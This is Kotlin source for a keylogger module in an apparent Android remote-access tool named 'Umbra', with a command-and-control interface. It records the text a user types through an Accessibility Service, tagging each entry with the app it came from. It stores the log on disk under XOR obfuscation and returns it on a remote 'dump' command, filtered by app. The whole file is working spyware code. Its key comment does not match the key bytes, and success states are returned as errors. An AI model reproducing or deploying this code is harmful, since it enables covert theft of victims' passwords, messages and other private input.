package org.umbra.core.modules

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import org.umbra.core.c2.Command
import org.umbra.core.core.KeylogEntry
import org.umbra.core.core.UmbraResponse
import java.io.File

/**
 * AccessibilityService-based keylogger.
 * Requires the user to enable Umbra Accessibility Service in Settings.
 * Keystrokes are stored both in-memory and on-disk (encrypted via simple XOR).
 *
 * The AccessibilityService is the actual Android service component.
 * This object provides the query interface and shared storage.
 */
object KeylogModule {

    private const val MAX_BUFFER = 1000
    private const val KEYLOG_FILE = "umbra_keylog.dat"
    private val keylogBuffer = mutableListOf<KeylogEntry>()
    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Umbra!"

    // Tracks hasActiveSession so we know if accessibility is running
    @Volatile var hasActiveSession = false

    /**
     * Called by the AccessibilityService when a key event is captured.
     */
    fun onKeyEvent(packageName: String, text: String) {
        val entry = KeylogEntry(
            text = text,
            package_name = packageName,
            timestamp = System.currentTimeMillis()
        )

        synchronized(keylogBuffer) {
            keylogBuffer.add(entry)
            if (keylogBuffer.size > MAX_BUFFER) {
                keylogBuffer.removeAt(0)
            }
        }
    }

    suspend fun start(context: Context, cmd: Command): UmbraResponse {
        // Accessibility Service must be started by the system via Settings
        // We just flag it as active
        return try {
            hasActiveSession = true
            UmbraResponse.ErrorResponse(
                "keylog:accessibility_service_must_be_enabled_in_settings",
                "keylog"
            )
        } catch (e: Exception) {
            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
        }
    }

    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
        hasActiveSession = false
        // Persist current buffer to disk before stopping
        persistToDisk(context)
        return try {
            UmbraResponse.ErrorResponse("keylog:stopped", "keylog")
        } catch (e: Exception) {
            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
        }
    }

    suspend fun dump(context: Context, cmd: Command): UmbraResponse {
        val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(MAX_BUFFER)
        val packageFilter = cmd.params["package"]

        return try {
            // Merge disk + memory
            val diskEntries = loadFromDisk(context)

            val merged = synchronized(keylogBuffer) {
                val all = (diskEntries + keylogBuffer).distinctBy { "${it.timestamp}_${it.text}" }
                val filtered = if (packageFilter != null) {
                    all.filter { it.package_name.contains(packageFilter) }
                } else {
                    all
                }
                filtered.takeLast(count)
            }

            UmbraResponse.KeylogResponse(
                keystrokes = merged,
                count = merged.size
            )
        } catch (e: Exception) {
            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
        }
    }

    /**
     * Persist current buffer to encrypted file on disk.
     */
    fun persistToDisk(context: Context) {
        try {
            val file = File(context.filesDir, KEYLOG_FILE)
            val entries: List<KeylogEntry>
            synchronized(keylogBuffer) {
                entries = keylogBuffer.toList()
            }

            val sb = StringBuilder()
            for (e in entries) {
                sb.append("${e.timestamp}|${e.package_name}|${e.text}\n")
            }

            val plain = sb.toString().toByteArray(Charsets.UTF_8)
            val encrypted = xorEncrypt(plain)
            file.writeBytes(encrypted)
        } catch (_: Exception) {}
    }

    /**
     * Load persisted entries from encrypted disk file.
     */
    private fun loadFromDisk(context: Context): List<KeylogEntry> {
        return try {
            val file = File(context.filesDir, KEYLOG_FILE)
            if (!file.exists()) return emptyList()

            val encrypted = file.readBytes()
            val plain = xorEncrypt(encrypted)
            val text = String(plain, Charsets.UTF_8)

            text.lines().filter { it.isNotBlank() }.mapNotNull { line ->
                val parts = line.split("|", limit = 3)
                if (parts.size >= 3) {
                    KeylogEntry(
                        timestamp = parts[0].toLongOrNull() ?: 0L,
                        package_name = parts[1],
                        text = parts[2]
                    )
                } else null
            }
        } catch (_: Exception) {
            emptyList()
        }
    }

    private fun xorEncrypt(data: ByteArray): ByteArray {
        val result = data.copyOf()
        for (i in result.indices) {
            result[i] = (result[i].toInt() xor xorKey[i % xorKey.size].toInt()).toByte()
        }
        return result
    }
}
